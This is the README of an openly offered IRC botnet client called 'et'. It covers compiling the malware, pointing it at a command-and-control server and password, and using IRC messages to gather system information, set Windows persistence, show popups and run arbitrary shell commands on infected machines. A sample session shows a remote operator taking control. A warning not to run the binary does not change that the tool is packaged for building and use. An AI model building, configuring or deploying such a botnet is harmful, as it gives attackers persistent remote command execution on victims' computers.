et - the extraterrestrial botnet
===

### What is it?
`et` is a dumb client to an IRC command-and-control server.

When activated, it "phones home" and awaits instructions from members of an IRC channel.

It can be instructed to retrieve system information and execute commands, among other things.

### Compilation

**IMPORTANT**: Many binary size reduction methods are not applied by default during *nix builds due to the wide variety of utilities/flags that provide that
functionality on different systems. For example, standard symbol stripping (-s) is not applied because OS X no longer uses (-s) to strip symbols.
To add your own size-optimization flags, either edit the makefile or feed them in by assigning to `LDFLAGS_NIX` while calling `make`.
In addition, on Windows, you can try using a third-party tool like [UPX](http://upx.sourceforge.net/) to further reduce executable size.

#### On *nix systems (Linux, BSD, OS X):
```bash
$ git clone https://github.com/woodruffw/et && cd et
$ make nix # compiles et in ./bin
```

#### On Windows:
Building on Windows requries `make` and `gcc`, both of which can be obtained through the [MinGW](http://www.mingw.org/) project.

Download the tarball, extract it somewhere, and run `mingw32-make` inside of that directory in CMD.exe. The `et.exe` binary will be left in "bin".


**IMPORTANT**: Do not actually run the resulting `et` binary, as it *WILL* open your computer to attack.

### Configuration

Many of `et`'s features can be configured in the *cnc_info.h* file under *./src*.

For example:
```C
#define IRC_SERVER "irc.example.com"
#define IRC_PORT 6667
#define IRC_CHANNEL "#yourchannel"
#define IRC_REPORT "hello!"
#define IRC_AUTH "super secret password"
```

Any changes made require recompilation.

### Usage
Controlling the `et` bots from the IRC server is very simple.

When each bot connects, it sends out a channel-wide message of the format:
```
et0000000: et0000000 phoning home
```

From that point on, the bot is ready to receive commands. There are a few built-in commands:
* `auth <password>` - Requests authorization to control the bot. If the password matches `IRC_AUTH` in *cnc_info.h*, authorization is granted.
* `deauth` - Deauthorizes control of the bot unconditionally. Once deauthorized, the bot may not execute any command but `auth`.
* `info` - Outputs a digest of system information. Supplied by `uname(3)` on Unix and Linux and `GetVersionEx` on Windows.
* `popup <message>` - **CURRENTLY WINDOWS ONLY**. Display a popup message on the client's screen.
* `persist` - **CURRENTLY WINDOWS ONLY**. Ensures that the `et` executable, if killed, will restart on the next login. 
* `depersist` - **CURRENTLY WINDOWS ONLY**. Does the opposite of `persist`, removing `et`'s persistence after logout.
* `kill` - Disconnects the bot from the IRC server. Unless scheduled otherwise on the system, the bot will never reconnect.

Aside from these four commands, all other commands passed to an `et` are passed directly to `popen(3)` (`_popen()` on Windows).

By default `deauth`, `info`, `kill`, and all other commands are restricted until the bot is authorized with `auth`.

Some examples, all from the IRC prompt:
```
et0000000: et0000000 phoning home
/msg et0000000 auth et-phone-home
et0000000: Successfully authorized. et0000000 listening.
/msg et0000000 info
et0000000: [some information]
/msg et0000000 pwd
et0000000: [the current working directory]
/msg et0000000 popup hello, i'm controlling your computer
/msg et0000000 kill
*et0000000 has quit ()
```

Currently, output from system commands is limited to approximately 512 characters. 

### Proof of Concept
The original PoC Python script can be found under *./src/poc/et.py*. Like the actual version, it does work and *WILL* expose your machine.

### Theoretical Limits
Because the IRC protocol limits nicks to 9 characters, only so many `et`s can operate within a single channel.

By default, the first two characters of an `et`'s nick will always be 'et,' meaning that at most 10 million `et`s can exist within a channel.
Furthermore, because I got lazy with the Windows version, the ID on Windows machines can only be in the range [0, (32768 << 8)] for a total number of 8,388,609 possible IDs on Windows.
Of course, because the trailing numbers are pseudorandom and not sequential, the actual point of collision is likely to be much lower than 10 million (or 8,388,609 for that matter).
On the other hand, `et` can be configured to "phone home" to other servers and channels, making the limit less relevant in practice.

### TODO
* Reduce binary size
* Limit message output to 510 characters (+ CR-LF) as per RFC 2812
* Prevent Windows CMD popups
* Add more built-in commands

### Contributing

`et` is licensed under the MIT licence. 

Please feel free to issue merge requests, even for small things. I appreciate all contributions.